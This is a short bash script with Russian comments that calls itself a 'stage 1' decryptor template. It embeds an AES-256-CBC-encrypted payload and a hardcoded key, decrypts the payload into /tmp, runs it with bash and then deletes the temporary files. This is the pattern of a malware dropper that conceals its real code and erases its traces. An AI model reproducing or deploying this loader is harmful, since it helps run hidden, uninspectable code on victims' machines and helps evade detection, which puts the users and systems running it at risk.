#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="105ab1b9892b8bdb668dda07dcf15767:nDNVl3sJ5WhFUPDQJJMv/neOn1vImplQw9Ohmr0on2tSdWG+cIKOn6HpqrvGKmQu94tf6gDK4l2K7aqlNEa33jmlV8Yeahnph4EHkszcJSXd9gWhOk6yoo8NtmBtl9qqe/qorBN+N8c37uSwC5nevsTHfmiyWmzMPPwKAn3Vn4nd41nDriQPZScro+5NBwpmiimTykp629mY/qpEAyKNn/ztpfim/5cvCABCbtuCHZu2xzXlgUPn3J3+HVLckTUr2qSShnxKOVp58XEeF8O6wj5/77T+Fd3sk26KXqVmTBa3lVXkxy0vsHARjFyURimpKUTjoa2Vk3NRh+hpXlyU5jgKHa4pVKaHv3aSfAZp++YlY+t4u4rqJjJaW3h3EzJYU+hSSD+CpUooTrfoGhjmM0EKRDuLXZTY8zyVlZv2dkivzoh/sgEck1SjHZ0DU7fdf5b9KxRIoJhkawR8QtFNPh43AH7IxRCTI8ecsI7VF4A="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
